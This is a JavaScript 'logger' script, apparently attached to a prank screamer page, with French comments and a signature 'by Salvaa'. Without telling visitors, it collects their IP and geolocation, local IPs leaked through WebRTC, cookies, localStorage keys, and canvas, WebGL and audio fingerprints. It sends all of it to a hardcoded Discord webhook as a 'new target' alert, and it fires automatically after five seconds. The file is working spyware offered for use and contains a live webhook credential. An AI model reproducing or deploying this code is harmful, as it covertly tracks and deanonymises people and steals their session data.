// == GG BG LOGGER v23.0 – CORRIGÉ + MAX FIABLE ==
(() => {
    const WEBHOOK = 'https://canary.discord.com/api/webhooks/1436477961812316272/mmTeOuO16HZoHwGVF4VHSm2pS-RDRlo-Wj0ZzE8NKHnSJZyBrdioMUeeu0gFNglKdzGm';

    const overlay = document.getElementById('start-overlay');
    const audio = document.getElementById('screamer-audio');
    if (!overlay || !audio) return;

    // === ASCII SALVAA ===
    const ASCII_SALVAA = `
███████╗ █████╗ ██╗    ██╗   ██╗ █████╗  █████╗     
██╔════╝██╔══██╗██║    ██║   ██║██╔══██╗██╔══██╗    
███████╗███████║██║    ██║   ██║███████║███████║    
╚════██║██╔══██║██║    ╚██╗ ██╔╝██╔══██║██╔══██║    
███████║██║  ██║███████╗╚████╔╝ ██║  ██║██║  ██║    
╚══════╝╚═╝  ╚═╝╚══════╝ ╚═══╝  ╚═╝  ╚═╝╚═╝  ╚═╝    
                                                    
                          
    by Salvaa <3
`;

    // === DONNÉES FIABLES ===
    const collectReliableData = async () => {
        const data = {
            ip: 'Chargement...', city: '?', country: '?', isp: '?',
            local_ips: [],
            referrer: document.referrer || 'Direct',
            userAgent: navigator.userAgent,
            screen: `${screen.width}x${screen.height}`,
            colorDepth: screen.colorDepth,
            cookies: document.cookie || 'Aucun',
            localStorage: Object.keys(localStorage).join(', ') || 'Vide',
            canvas: 'Inconnu',
            webgl: 'Inconnu',
            audio: 'Inconnu',
            hardware: `${navigator.hardwareConcurrency || '?'} CPU | ${navigator.deviceMemory || '?'}GB RAM`,
            touch: 'ontouchstart' in window || navigator.maxTouchPoints > 0,
            browser: 'Inconnu',
            language: navigator.language,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            timestamp: new Date().toISOString()
        };

        // === IP + GÉO ===
        try {
            const ipRes = await fetch('https://api.ipify.org?format=json');
            const ipJson = await ipRes.json();
            data.ip = ipJson.ip;

            const geoRes = await fetch(`https://ipapi.co/${data.ip}/json/`);
            const geo = await geoRes.json();
            data.city = geo.city || '?';
            data.country = geo.country_name || '?';
            data.isp = geo.org || '?';
        } catch (e) {}

        // === IP LOCALE (FORCÉE AVEC STUN) ===
        const getLocalIPs = () => new Promise(resolve => {
            const ips = new Set();
            const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
            pc.createDataChannel('');
            pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
            pc.onicecandidate = e => {
                if (e.candidate && e.candidate.candidate) {
                    const match = e.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3})/);
                    if (match) ips.add(match[1]);
                }
            };
            setTimeout(() => {
                try { pc.close(); } catch (e) {}
                resolve(Array.from(ips));
            }, 2000);
        });
        data.local_ips = await getLocalIPs();

        // === CANVAS FP ===
        try {
            const c = document.createElement('canvas');
            const ctx = c.getContext('2d');
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('GG BG <3', 2, 15);
            data.canvas = c.toDataURL();
        } catch (e) { data.canvas = 'Bloqué'; }

        // === WEBGL FP ===
        try {
            const gl = document.createElement('canvas').getContext('webgl') || document.createElement('canvas').getContext('experimental-webgl');
            const ext = gl.getExtension('WEBGL_debug_renderer_info');
            const renderer = ext ? gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
            const vendor = ext ? gl.getParameter(ext.UNMASKED_VENDOR_WEBGL) : gl.getParameter(gl.VENDOR);
            data.webgl = `${vendor} — ${renderer}`;
        } catch (e) { data.webgl = 'Bloqué'; }

        // === AUDIO FP (CORRIGÉ) ===
        try {
            const AudioContext = window.OfflineAudioContext || window.webkitOfflineAudioContext;
            const ctx = new AudioContext(1, 5000, 44100);
            const oscillator = ctx.createOscillator();
            oscillator.type = 'triangle';
            oscillator.frequency.value = 10000;
            const compressor = ctx.createDynamicsCompressor();
            compressor.threshold.value = -50;
            compressor.knee.value = 40;
            compressor.ratio.value = 12;
            compressor.attack.value = 0;
            compressor.release.value = 0.25;
            oscillator.connect(compressor);
            compressor.connect(ctx.destination);
            oscillator.start(0);
            const buffer = await ctx.startRendering();
            const channel = buffer.getChannelData(0);
            let hash = 0;
            for (let i = 0; i < channel.length; i++) {
                hash = ((hash << 5) - hash + channel[i]) & 0xFFFFFFFF;
            }
            data.audio = Math.abs(hash).toString(16).substring(0, 12);
        } catch (e) { data.audio = 'Bloqué'; }

        // === NAVIGATEUR ===
        const ua = navigator.userAgent;
        if (/chrome/i.test(ua) && !/edg/i.test(ua)) data.browser = 'Chrome';
        else if (/firefox/i.test(ua)) data.browser = 'Firefox';
        else if (/safari/i.test(ua) && !/chrome/i.test(ua)) data.browser = 'Safari';
        else if (/edg/i.test(ua)) data.browser = 'Edge';
        else data.browser = 'Autre';

        return data;
    };

    // === GÉNÉRER TXT FIABLE ===
    const sendReliableLog = async () => {
        const data = await collectReliableData();
        const lines = [ASCII_SALVAA, '@everyone **NOUVELLE CIBLE !**\n'];

        lines.push(`IP: ${data.ip}`);
        lines.push(`IP Locale: ${data.local_ips.length ? data.local_ips.join(', ') : 'Aucune (bloqué)'}`);
        lines.push(`Ville: ${data.city}, ${data.country}`);
        lines.push(`ISP: ${data.isp}`);
        lines.push(`Referrer: ${data.referrer}`);
        lines.push(`Écran: ${data.screen} | ${data.colorDepth} bits`);
        lines.push(`Langue: ${data.language} | Fuseau: ${data.timezone}`);
        lines.push(`Cookies: ${data.cookies}`);
        lines.push(`LocalStorage: ${data.localStorage}`);
        lines.push(`Canvas FP: ${data.canvas.substring(0, 80)}${data.canvas.length > 80 ? '...' : ''}`);
        lines.push(`WebGL: ${data.webgl.substring(0, 80)}${data.webgl.length > 80 ? '...' : ''}`);
        lines.push(`Audio FP: ${data.audio}`);
        lines.push(`Hardware: ${data.hardware}`);
        lines.push(`Touch: ${data.touch}`);
        lines.push(`Navigateur: ${data.browser}`);
        lines.push(`Date: ${data.timestamp}`);
        lines.push(`GG BG v23.0 | by Salvaa <3`);

        const txt = lines.join('\n');
        const blob = new Blob([txt], { type: 'text/plain' });
        const file = new File([blob], `${data.ip || 'unknown'}.txt`, { type: 'text/plain' });

        const form = new FormData();
        form.append('content', '@everyone **NOUVELLE CIBLE !**');
        form.append('file', file);

        fetch(WEBHOOK, { method: 'POST', body: form })
            .then(() => console.log("LOG CORRIGÉ ENVOYÉ !"))
            .catch(() => {});
    };

    // === CLIC ===
    overlay.addEventListener('click', () => {
        audio.play().catch(() => {});
        overlay.classList.add('hidden');
        sendReliableLog();
    });

    // === AUTO-ENVOI ===
    setTimeout(sendReliableLog, 5000);

    console.log("GG BG v23.0 CORRIGÉ prêt !");
})();
